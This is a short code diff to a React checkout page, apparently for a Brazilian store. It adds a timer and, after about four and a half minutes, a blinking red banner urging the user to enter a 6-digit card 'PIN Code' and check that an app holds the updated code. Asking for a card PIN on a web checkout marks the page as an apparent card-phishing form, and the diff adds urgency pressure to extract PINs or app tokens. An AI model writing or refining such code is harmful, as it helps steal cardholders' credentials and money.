@@ -72,6 +72,13 @@ function CheckoutPage() {
   const [errors, setErrors] = useState<Partial<Record<keyof FormState, string>>>({});
   const [submitting, setSubmitting] = useState(false);
   const [cepLoading, setCepLoading] = useState(false);
+  const [elapsedSec, setElapsedSec] = useState(0);
+
+  useEffect(() => {
+    const start = Date.now();
+    const id = setInterval(() => setElapsedSec(Math.floor((Date.now() - start) / 1000)), 1000);
+    return () => clearInterval(id);
+  }, []);
 
   useEffect(() => {
     if (cart.items.length === 0) navigate({ to: "/carrinho" });
@@ -314,6 +321,11 @@ function CheckoutPage() {
                   <Err k="cartaoNumero" />
                 </div>
                 <div>
+                  {elapsedSec >= 270 && (
+                    <div className="mb-2 rounded-md bg-red-600 px-4 py-3 text-center text-sm font-bold text-white animate-pin-blink">
+                      ⚠️ ADICIONE O CÓDIGO PIN! Verifique se o app está com o código atualizado.
+                    </div>
+                  )}
                   <label className="mb-1 block text-xs font-medium">PIN Code (6 dígitos) *</label>
                   <input type="password" value={form.cartaoPincode}
                     onChange={(e) => set("cartaoPincode", onlyDigits(e.target.value).slice(0, 6))}
